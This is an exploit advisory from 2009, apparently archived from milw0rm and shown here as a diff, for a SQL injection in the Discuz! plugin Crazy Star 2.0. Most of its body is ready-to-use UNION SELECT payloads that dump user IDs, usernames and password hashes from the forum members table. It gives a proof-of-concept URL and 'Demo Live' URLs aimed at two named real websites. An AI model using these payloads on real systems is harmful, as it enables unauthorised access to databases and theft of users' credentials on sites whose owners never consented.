@@ -1,0 +1,43 @@
+============================================================
+Discuz! Plugin Crazy Star <= 2.0 Sql injection Vulnerability
+============================================================
+
+========================[Author]============================                    
+
+ [+] Founded 	: ZhaoHuAn				     
+ [+] Contact	: ZhengXing[at]shandagames[dot]com	         
+ [+] Blog	: http://www.patching.net/zhaohuan/	         
+ [+] Date	: August, 26th 2009 [Double Seventh Festival]	 
+								 
+========================[Soft Info]=========================		 
+								 
+Software: Discuz! Plugin Crazy Star(family)		         
+Version	: 2.0					                 
+Vendor	: http://www.discuz.com			             	 
+
+
+
+[-] Exploit:
+[+] 1) Register a User
+    2) Login!
+[+] and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,group_concat(uid,0x3a,username,0x3a,password),25,26,27,28,29,30,31 from cdb_members--
+
+[-] SqlI PoC:
+[+] http://target/[path]/plugin.php?identifier=family&module=family&action=view&fmid=1+and+1=2+unIon+selecT+ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,group_concat(uid,0x3a,username,0x3a,password),25,26,27,28,29,30,31 from cdb_members--
+    [?] = Valid fmid Number
+
+[+] Demo Live:
+[-] http://sj.netease.com/plugin.php?identifier=family&module=family&action=view&fmid=6+and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,group_concat(uid,0x3a,username,0x3a,password),19,20,21,22,23,24,25,26,27,28,29,30,31 from bbs_members--
+
+[-] http://www.war3club.net/plugin.php?identifier=family&module=family&action=view&fmid=11+and+1=2+unIon+selecT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,group_concat(uid,0x3a,username,0x3a,password),25,26,27,28,29,30,31,32,33 from cdb_members--
+
+
+/---------------------------------------------www.zhaohuan.net-------------------------------------------------\  
+
+  Today is the VALENTINE'S Day in China, the seventh day of the seventh lunar month.
+  Raise your head on August 26 and gaze at the stars, you will find something romantic going on in the sky  ;) 
+  Greetz : Weeny <- love u more & more
+
+\--------------------------------------------------------------------------------------------------------------/
+
+# milw0rm.com [2009-08-26]
